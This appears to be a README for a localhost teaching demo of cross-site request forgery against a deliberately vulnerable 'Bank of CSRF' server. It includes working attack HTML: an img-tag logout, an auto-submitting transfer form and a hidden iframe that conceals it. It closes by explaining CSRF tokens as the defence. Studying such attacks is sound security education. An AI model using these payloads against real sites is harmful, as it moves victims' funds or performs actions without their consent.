#Setting up
To run the demo you need to have Python 2 and Twisted installed.

$ apt-get install python
$ pip install twisted

Run bank server on port 8080
$ python csrf_bank_server.py 8080 
# TODO: change the following variables
USE_CSRF_TOKENS = True
COOKIE_TOKENS = True

Run another webserver on a different port to server Dr. Evil's website
$ python -m SimpleHTTPServer 8000

#Using Bank of CSRF

Go to http://localhost:8080.
There are two accounts on the server:
1) username=victim password=unhashed
2) username="dr evil" password="mini me"

You can look at the source code to see how the site works.

The page http://localhost:8080/ checks if a valid session cookie is present.
If so it presents a form for transfering funds from one account to another.
If no valid session cookie is present, the page shows a login form.

http://localhost:8080/login accepts a post request with a username and
password. If the credential are correct is sets a cookie called session_cookie.
After login, the user is redirected to the home page.

http://localhost:8080/transfer accepts post requests and transfers funds
from one account to another provided the session cookie as form parameters
are valid.

To send arbitrary post requests to the server use:
$ curl -L -d "post request body" http://localhost:8080/login

Note: the -L flag tells curl to follow redirects.

example: 
$ curl -L -v -d "username=dr evil&password=mini me" http://localhost:8080/login

Note: the -v flag causes curl to display reply headers which include any
	Set-Cookie headers.

To specify arbitrary cookies use:
$ curl --cookie "key=value" http://localhost:8080/

#GET Based CSRF Vulnerabilities
Websites cause the user's browser to issue GET requests of other sites all the
time. For example A.com might have the HTML:

<img src="http://B.com/image.png" />

This causes a GET request for http://B.com/image.png to be sent. Any cookies
the user has for the site will be sent along too.

The src field for an <img> tag does not need to point to an actual image. The
browser has no way of telling if the src actually is an image until after the
request has been made.

Consider this, what if Mini Me put the following HTML on his website.

<img src="http://localhost:8080/logout" />

On receiving the request from the user, the server checks for a session cookie
and if one is present, removes it from its database.

This means Mini Me can logout anyone who visits his site.

To see how this works, log into Bank of CRSF in one tab. Then go to
http://localhost:8000/getting_evil.html. Now if you refresh the other tab,
you should be logged out.

#POST Based CSRF Vulnerabilities
The real goldmine is POST forms like the one used to transfer money between
accounts. The site generates forms of the following form:

<form action="/transfer" method="post">
	victim's balance: 1000</br>
	Destination account: <input type="text" name="dest" /></br>
	Transfer amount: <input type="number" name="amount" min="0" max="1000" /></br>
	<input type="submit" value="Transfer" />
</form>

Anyone can make requests like this:
$ curl -L -d "dest=dr evil&amout=666" http://localhost:8080/transfer

The only reason the requests do no cause a transfer, is that you need to send a
valid session cookie along with the request. As we just saw, tricking a user's
browser into making GET requests with valid cookies is easy. Making POST requests
is a little bit harder, but not by much.

Dr Evil just has to add the following HTML:

	<form action="http://localhost:8080/transfer" method="post" id="form">
		Destination account: <input type="text" name="dest" value="dr evil"/>
		Transfer amount: <input type="number" name="amount" value="666" />
		<input type="submit" value="Transfer" />
	</form>

The only step left is getting someone to click transfer, but nobody would fall
for that. Luckily we can submit the form automatically by adding the following
script:

	<script>
		window.onload = function() {
			document.getElementById('form').submit();
			//check your balance now
		}
	</script>

To see this in action, log back in as victim. Take note of the current account
balances. Now go to http://localhost:8000/hidden_evil_iframe.html. If you
pay close attention, you should notice the page briefly flash by before you
are redirected to http://localhost:8080/transfer. Now going back to the home
page, you should see the balance has changed, so the attack worked.

The only problem is the attack is not subtle as is easy to notice.

Fixing this is simple. Create another webpage and add this HTML:

	<iframe src="hidden_evil_iframe.html" style="visibility: hidden"></iframe>

Now when the user visits this new page, the evil page still loads and runs,
but the <iframe> it loads in is hidden, so the user won't notice.

# CSRF Tokens
To protect against CSRF attacks, requests should require information the
attacker does not know and the user does not automatically provide. One
way is for the server to generate a random "csrf token."
The site then adds the additional field to forms it gives to the user.

	<input type="hidden" name="csrf_token" value="dgL2+Ur3367X+HZni8Ybyg==" />
	<!-- value is whatever token the server just generated -->

Because the form with the random token is returned to the user, the attacker
does not know the token value. When a form is submitted the server compares
the token with what it generated.
The server can either save copies or give then to users to save as cookies.
